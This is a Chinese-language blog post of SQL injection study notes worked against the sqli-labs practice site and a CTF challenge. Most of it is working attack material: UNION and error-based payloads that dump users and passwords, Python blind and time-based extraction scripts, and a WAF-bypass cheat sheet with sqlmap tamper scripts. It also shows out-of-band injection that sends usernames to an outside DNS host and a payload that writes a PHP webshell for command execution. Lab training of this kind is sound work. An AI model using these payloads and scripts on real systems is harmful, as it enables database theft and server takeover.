---
title: sql注入
---

# sql注入

​      December 20, 2023            17023    

sql教程：https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h#%20%E3%80%8Asql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B%E3%80%8B

## sqli

建议在火狐浏览器中安装hackbar插件，可以更方便的编辑语句。

谷歌浏览器官网：https://www.google.com/chrome/

翻墙工具推荐：https://console.xenolink.net/#/register?code=vocvktBL

### yakit

安装yakit后点击项目

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)yakit1

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)yakit2

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)yakit3

### burpsuite

使用教程https://www.jianshu.com/p/025bcbbbd97f

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)bp睡眠注入

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)bp盲注爆破

### 基础操作

判断注入点：
/Less-1/?id=1’ and 1=2– -

猜字段数：
运用order by(二分法)
`/Less-1/?id=2' order by 3-- -`

找回显：
`/Less-1/?id=2' union select 1,2,3-- -`

查看当前数据库和数据库版本
database() 、version()

爆数据库
`/Less-1/?id=2' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata`

找表名字
运用group_concat()函数
`/Less-1/?id=2' and 1=2 union  select 1,group_concat(table_name),@@basedir  from  information_schema.tables where table_schema="数据库名"-- -`

找字段名
`/Less-1/?id=2' and 1=2 union select  1,group_concat(column_name),@@basedir  from information_schema.columns  where table_name="表名"-- -`

爆记录
`/Less-1/?id=2' and 1=2 union select 1,group_concat(id,email_id),3  from 表名-- -`

查看内容
`/Less-1/?id=2' and 1=2 union select 1,group_concat(id),group_concat(email_id)  from 表名-- -`

```
group_concat(column_name) from information_schema.columns where table_name='student'#&passwd=&Submit=Submit
```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)information_schema

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)数据库查询

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)union联合查询流程

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)注释

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)mysql函数

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)mysql函数1

### postman操作

在firefox的相关网页打开网络，刷新网页找到api，打开postman按要求输入get或post等传输方式与地址，新建key：id，在value中执行语句。展示的效果与在浏览器网址输入类似，但更为清晰。

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)示例

### sql注入

#### 报错注入十大方法

```
1.floor() 　　如：select * from test where id=1 and (select 1 from (select  count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
2.extractvalue()　　如：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
3.updatexml()　　如：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
4.geometrycollection()　　如：select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
5.multipoint()　　如：select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
6.polygon()　　如：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
7.multipolygon()　　如：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
8.linestring()　　如：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
9.multilinestring()　　如：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
10.exp()　　如：select * from test where id=1 and exp(~(select * from(select user())a));
```

#### python脚本sql注入(盲注)

利用py写一个通过二分法在ASCII码32到128范围内逐个推断user()的脚本。

如`http://192.168.2.60/sqli/Less-8/?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -`

这段语句就是通过转化为ASCII码的方式找出需要的信息，但在码表中一个个寻找符合的字符显然需要耗费过多精力，因此通过脚本来更轻易的实现功能

```
import requests
session = requests.session()
url = "http://192.168.2.60/sqli/Less-8/?id=1'"
def db():
    name = ''
    for i in range(1,50):
        begin =32
        end =128
        tmp = (begin+end)//2
        while begin < end :
            paramsGet = url+ "/**/and/**/ascii(substr(user(),{0},1))>{1}--+".format(i,tmp)
            response = session.get(paramsGet)
            if 'You are in...........' in response.text:
                begin = tmp + 1
                tmp = (begin+end)//2
            else:
                end = tmp
                tmp = (begin+end)//2
        if(tmp==32):
            break
        name += chr(tmp)
        print(name)
db()
```

显示结果如下：

```
PS C:\Users\Administrator> & C:/env/python3.12/python.exe c:/Users/Administrator/Desktop/py/1.py
r
ro
roo
root
root@
root@l
root@lo
root@loc
root@loca
root@local
root@localh
root@localho
root@localhos
root@localhost
```

其它相同类型的通过更改相关部分通解，如：

```
import requests
session = requests.session()
url = "http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1'"
def db():
    name = ''
    for i in range(1,50):
        begin =32
        end =128
        tmp = (begin+end)//2
        while begin < end :
            paramsGet = url+ "/**/and/**/ascii(substr((select group_concat(username,password) from ctfshow_user4 where username='flag'),{0},1))>{1}--+".format(i,tmp)
            response = session.get(paramsGet)
            if "admin" in response.text:
                begin = tmp + 1
                tmp = (begin+end)//2
            else:
                end = tmp
                tmp = (begin+end)//2
        if(tmp==32):
            break
        name += chr(tmp)
        print(name)
db()
```

#### 睡眠注入

```
import requests
import time
session = requests.session()
url = "http://192.168.2.60/sqli/Less-9/?id=1'"
def db():
    name = ''
    for i in range(1,10):
        begin =32
        end =128
        tmp = (begin+end)//2
        while begin < end :
            start_time=time.time()
            paramsGet = url+ "/**/and/**/if(ascii(substr(database(),{0},1))>{1},1,sleep(2))--+".format(i,tmp)
            response = session.get(paramsGet)
            end_time=time.time() 
            if end_time-start_time<2:
                begin = tmp + 1
                tmp = (begin+end)//2
            else:
                end = tmp
                tmp = (begin+end)//2
        if(tmp==32):
            break
        name += chr(tmp)
        print(name)
db()
```

#### uagent头注入

通过连接增加插入语句的方式

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)两种方式

#### post注入

随便输入，再根据错误提示输入账号。这里就不赘述了

#### 带外注入

http://127.0.0.1/sqli/Less-1/?id=1' and if((select load_file(concat('\\\\', (select username from users where id=1),'.28dabfb57fd8fc80.gobygo.net\\abc'))),1,1)-- -

![image-20240222202617216](https://raw.githubusercontent.com/20231201/123/main/image-20240222202617216.png)

http://127.0.0.1/sqli/Less-1/?id=1' and if((select load_file(concat('\\\\', (select substr((select group_concat(username) from users),1,5)),'.340b7010f18a2f20.gobygo.net\\abc'))),1,1)-- -

#### webshell

1. 在phpstudy_pro\Extensions\MySQL5.7.26\my.ini文件中添加语句`secure_file_priv=""`

2. 在网页中执行语句：`http://192.168.2.60/sqli/Less-1/?id=-1' union  select 1,@@datadir,"<?php @system($_GET[a]);  ?>" into outfile  "C:\\phpstudy_pro\\WWW\\phpinfo.php" -- -`

3. 这时可以看到www文件下出现了phpinfo.php

   ![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)phpinfo.php

4. 通过在网页输入该文件地址加（?a=指令）传参，可控制原机执行指令

#### sqlmap

在kali中可以直接执行sqlmap

下载地址：https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip

查询可操作指令：`python3 sqlmap.py -h`

查询数据指令：`python3 sqlmap.py  -u "http://192.168.2.60/sqli/Less-1/?id=1" --dbs`（查询数据库）

`python3 sqlmap.py  -u "http://192.168.2.60/sqli/Less-1/?id=1"  --batch -D security --tables`（指定查询数据库表）

`python3 sqlmap.py  -u "http://192.168.2.60/sqli/Less-1/?id=1"  --batch -D security -T users -C "id,username" --dump`（指定查询id，username）

SQLMap是一款SQL注入神器，可以通过tamper对注入payload 进行编码和变形，以达到绕过某些限制的 目的。但是有些时候，SQLMap自带的Tamper脚本并不是特别好用，需要根据实际情况定制Tamper脚本。

序号	脚本名称	注释
1	0x2char	将每个编码后的字符转换为等价表达
2	apostrophemask	单引号替换为Utf8字符
3	apostrophenullencode	替换双引号为%00%27
4	appendnullbyte	有效代码后添加%00
5	base64encode	使用base64编码
6	between	比较符替换为between
7	bluecoat	空格替换为随机空白字符，等号替换为like
8	chardoubleencode	双url编码
9	charencode	将url编码
10	charunicodeencode	使用unicode编码
11	charunicodeescape	以指定的payload反向编码未编码的字符
12	commalesslimit	改变limit语句的写法
13	commalessmid	改变mid语句的写法
14	commentbeforeparentheses	在括号前加内联注释
15	concat2concatws	替换CONCAT为CONCAT_WS
16	equaltolike	等号替换为like
17	escapequotes	双引号替换为\
18	greatest	大于号替换为greatest
19	halfversionedmorekeywords	在每个关键字前加注释
20	htmlencode	html编码所有非字母和数字的字符
21	ifnull2casewhenisnull	改变ifnull语句的写法
22	ifnull2ifisnull	替换ifnull为if(isnull(A))
23	informationschemacomment	标示符后添加注释
24	least	替换大于号为least
25	lowercase	全部替换为小写值
26	modsecurityversioned	空格替换为查询版本的注释
27	modsecurityzeroversioned	添加完整的查询版本的注释
28	multiplespaces	添加多个空格
29	nonrecursivereplacement	替换预定义的关键字
30	overlongutf8	将所有字符转义为utf8
31	overlongutf8more	以指定的payload转换所有字符
32	percentage	每个字符前添加%
33	plus2concat	将加号替换为concat函数
34	plus2fnconcat	将加号替换为ODBC函数{fn CONCAT()}
35	randomcase	字符大小写随机替换
36	randomcomments	/**/分割关键字
37	securesphere	添加某字符串
38	sp_password	追加sp_password字符串
39	space2comment	空格替换为//
40	space2dash	空格替换为–加随机字符
41	space2hash	空格替换为#加随机字符
42	space2morecomment	空格替换为/_/
43	space2morehash	空格替换为#加随机字符及换行符
44	space2mssqlblank	空格替换为其他空符号
45	space2mssqlhash	空格替换为%23%0A
46	space2mysqlblank	空格替换为其他空白符号
47	space2mysqldash	空格替换为–%0A
48	space2plus	空格替换为加号
49	space2randomblank	空格替换为备选字符集中的随机字符
50	symboliclogical	AND和OR替换为&&和||
51	unionalltounion	union all select替换为union select
52	unmagicquotes	宽字符绕过GPC
53	uppercase	全部替换为大写值
54	varnish	添加HTTP头
55	versionedkeywords	用注释封装每个非函数的关键字
56	versionedmorekeywords	使用注释绕过
57	xforwardedfor	添加伪造的HTTP头

##### 使用正则替换：

 m = “welcome,test” import re re.sub(r”test”,”tiihuan”,m) # 第一个搜索值。第二个替换值，第三个上搜索资源或变量 ‘wlcome,tihuan’   #打印内容

##### 用replace方法

python m=”welcome, test” m.replace(“test”, ‘’) ‘welcome, ‘  # 打印

##### kali tamper

###### 目录

/usr/share/sqlmap/tamper/

###### 格式

```
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace('union', 'UnioN')
    return payload
sqlmap -u "http://192.168.2.31/sqli/Less-26a/?id=1" -p id --dbms=MySQL --tamper="2" --dbs --batch
sqlmap -u http://192.168.2.31/sqli-labs/Less-26a/?id=1 -p id --tamper=2 -D security -T users -C username --dump --batch
```

#### 绕过

```
1.注释符绕过
id=1' union select 1,2,3 or '1'='1
(少写闭合符进行闭合，不用注释符注释后面的')
常用的注释符有：
1）-- 注释内容
2）# 注释内容
3）/注释内容/
eg：union select 1,2#
union select 1,2 --+
构造闭合 ’ union select 1,2’
2.大小写绕过
常用于 waf的正则对大小写不敏感的情况。
eg：uniOn selEct 1,2
3.内联注释绕过
内联注释就是把一些特有的仅在MYSQL上的语句放在 /!../ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*… */搞混了。
eg：union /!select/ 1,2
4.双写关键字绕过
一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。
eg：union seselectlect 1,2
5.特殊编码绕过
1）十六进制绕过
eg：UNION SELECT 1,group_concat(column_name) from
information_schema.columns where table_name=0x61645F6C696E6B
2）ascii编码绕过
eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
3）Unicode编码
常用的几个符号的一些Unicode编码：
单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
6.空格过滤绕过
可代替空格的方式：
1）/**/
2）()
3）回车(url编码中的%0a)
4）`(tap键上面的按钮)
5）tap
6）%20
7）%0a
8）%a0
9）%09
10）%0C
11）%0D
12）%0B
13）+
14）两个空格
15）//
17）/*!  */     /*!90000  */
16）没有空格的报错注入
      举例 id=-1'||extractvalue(1,concat('~',select(database())))#
eg：union//select//1,2
select(passwd)from(users) #注意括号中不能含有*
selectpasswdfromusers
7.过滤or and xor(异或) not 绕过
（and和or被过滤掉时，可以用异或（同0异1）和同或（同1异0））
and = &&
or = ||
异或
xor = |
1^1^0     1^1^1
同或
not = !
8.过滤等号=绕过
1）不加通配符的like执行的效果和=一致，所以可以用来绕过。
eg：UNION SELECT 1,group_concat(column_name) from
information_schema.columns where table_name like “users”
2）rlike:模糊匹配，只要字段的值中存在要查找的 部分
就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样
eg：UNION SELECT 1,group_concat(column_name) from
information_schema.columns where table_name rlike “users”
3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配
eg：UNION SELECT 1,group_concat(column_name) from
information_schema.columns where table_name regexp “users”
4）使用大小于号来绕过
eg：select * from users where id > 1 and id < 3
5）<> 等价于 !=，所以在前面再加一个!结果就是等号了
eg：select * from users where !(id <> 1)
9.过滤大小于号绕过
在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。
1）greatest(n1, n2, n3…):返回n中的最大值
eg：select * from users where id = 1 and
greatest(ascii(substr(username,1,1)),1)=116
2）least(n1,n2,n3…):返回n中的最小值，与上同理。
3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回1
eg：select * from users where id = 1 and
strcmp(ascii(substr(username,1,1)),117)
4）in关键字
eg：select * from users where id = 1 and substr(username,1,1) in (‘t’)
5）between a and b:范围在a-b之间，包括a、b。
eg：select * from users where id between 1 and 2
select * from users where id between 1 and 1
10过滤引号绕过
1）使用十六进制
eg：UNION SELECT 1,group_concat(column_name) from
information_schema.columns where table_name=0x61645F6C696E6B
2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 ‘(单引号)，单引号会被转义成’
eg：%E6’ union select 1,2 #
%df%27 union select 1,2,3 #
11.过滤逗号绕过
1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for
len，其中pos代表从pos个开始读取len长度的子串 eg：常规写法 select substr(“string”,1,3)
若过滤了逗号，可以使用from pos for len来取代 select substr(“string” from 1 for 3)
sql盲注中 select ascii(substr(database() from 1 for 1)) > 110
2）也可使用join关键字来绕过
eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c
上式等价于 union select 1,2,3
3）使用like关键字，适用于substr()等提取子串的函数中的逗号
eg：select user() like “t%”
上式等价于 select ascii(substr(user(),1,1))=114
5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2
eg：select * from users limit 1 offset 2
上式等价于 select * from users limit 2,1
12.过滤函数绕过
1）sleep() -->benchmark()
MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
eg：select 1,2 and benchmark(1000000000,1)
2）ascii()–>hex()、bin()，替代之后再使用对应的进制转string即可
3）group_concat()–>concat_ws()，第一个参数为分隔符
eg：mysql> select concat_ws(“,”,“str1”,“str2”)
4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()(可以突破长度限制)
5）user() --> @@user、datadir–>@@datadir
6）ord()–>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。
```

##### 安全狗绕过

安装：

apachbin目录输入cmd

```
httpd.exe -k install -n apache2.4
```

相关参考：https://zhuanlan.zhihu.com/p/563904977

#### 宽字节注入

宽字节顾名思义就是两个及以上的字节表示一个中文汉字。在sql注入中，当用户输入中包含特殊字符，比如(单引号’)，(双引号”)，(斜杠/)等，为了过滤用户输入的这些特殊字符，会在字符前面加一个\转义字符对特殊字符进行转义。而大多数网站使用utf-8编码，utf-8编码会认为一个中文字符占三个字节；而后端mysql常用GBK编码，GBK编码认为一个中文占两个字节。所以针对这个原理，我们可以构造中文汉字来绕过字符转义。

绕过原理

当输入id=1’的时候，网站的utf-8编码会将1’编码为1',这里就网站就自动添加了\将后面的’进行了转义；其url编码为1%5c%27。其中%5c是\的url编码；%27是’的url编码。当该语句到后端执行的时候，mysql的编码可是会将%5和%27结合在一起形成两个字节来判断中文汉字。注意，只有当前一个符号的ASCII大于或等于128的时候才能到达汉字范围。

所以为了避免’被转义，我们手动在%5c前面加入一个%df的url编码。（为什么加%df？因为%df的ascii编码刚好是128，所以加上该编码可以达到汉字范围，添加其他的也可以，只要ascii编码大于等于128即可。）这个时候我们的输入变成了id=1%df’,同理，url编码会编码为id=1%df%5c%27。这个时候该语句带入到后端执行，GBK编码会认为%df%5c这两个字节构成了一个’運’字，后面的%27仅剩下一个字节，所以不会被解析为汉字。这个时候语句就变成了id=運’，就绕过了字符的转义。

为什么编码要大于128？

在GBK编码中，128以下的字节被用作控制字符或保留。所以，如果我们要插入一个可见字符（例如汉字），我们需要使用一个大于128的字节值。

#### 靶场演练

mysql数据结构:

在练习靶场前我们需要了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。我们前面机关讲解比较详细后面就比较简单了。 

1：

判断是否存在sql注入

提示你输入数字值的ID作为参数，我们输入?id=1

通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。

接下来我们判断sql语句是否是拼接，且是字符型还是数字型。

可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理:联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。

```
?id=1'order by 3 --+
?id=-1'union select 1,2,3--+
?id=-1'union select 1,database(),version()--+
```

爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是user和passwd。

```
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。

该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。

```
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。

```
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

2数字型注入

32’)

41”)

5布尔盲注（文档内有）

6只需将第五关的单引号换成双引号就可以了

71’))

8和5一样

9睡眠注入（文档内有）

10同九“

11在账号框内联合注入

12”

13‘

14“

1516可以布尔盲注，也能在画面中试出来

17报错注入

```
0' and (updatexml(1,concat(0x7e,version(),0x7e),1))#     爆版本
0' and (updatexml(1,concat(0x7e,database(),0x7e),1))#    爆数据库
0' and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#      爆表名
0' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x7e),1))#
   爆字段名
0' and (updatexml(1,concat(0x7e,(select password from (select password from users where username='admin1') b),0x7e),1))#
爆密码该格式针对mysql数据库。
爆其他表就可以，下面是爆emails表
0' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x7e),1))#
0' and (updatexml (1,concat(0x7e,(select group_concat(id,email_id) from emails),0x7e),1))#   爆字段内容。
```

18User-Agent头

```
1' ,2, (extractvalue(1,concat(0x7e,(select group_concat(password,username) from users),0x7e)))#   爆账户密码。
1',2,updatexml (1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#   爆账户密码。
```

19refer

```
1',updatexml (1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#
```

20cookie

```
'and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
```

21base64编码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)21

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)21编码

22双引号base64编码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)22

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)22编码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)23

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)24

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)25

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)25a

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)26

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)26a

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)27

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)27a

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)28

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)28a

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)29

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)29_1

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)30

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)30

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)31

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)32字段

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)32查询

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)32users转换为十六进制

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)33，似乎和32一样

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)34

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)35

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)36

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)37

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)38

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)39

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)40

## oracle

靶场地址：https://portswigger.net/web-security/all-labs